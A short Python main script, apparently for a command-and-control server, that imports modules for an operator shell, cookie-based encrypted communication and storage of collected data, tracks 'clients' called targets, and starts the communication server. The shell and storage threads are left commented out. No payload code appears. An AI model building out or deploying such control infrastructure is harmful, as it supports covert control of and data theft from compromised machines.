#!/usr/bin/python3
from threading import Lock
from modules.cc.shell import shell_main
from modules.cookie_comm import communication_server_main
from modules.client import Client
from modules.crypto import encrypt, decrypt
from modules.cc.data_storage import store_data_main

import concurrent.futures

if __name__ == '__main__':
    clients = dict()
    clients_lock = Lock()
    # clients['Target_1'] = Client('Target_1')

    communication_server_main(clients, clients_lock, encrypt, decrypt)

    # with concurrent.futures.ThreadPoolExecutor(max_workers=2) as executor:
        # thread for connection 
        
        # executor.submit(communication_server_main, clients, clients_lock, encrypt, decrypt)
        
        # thread for shell
        # shell_main(clients, clients_lock)
        # executor.submit()

        # thread to store data
        # executor.submit(store_data_main, clients)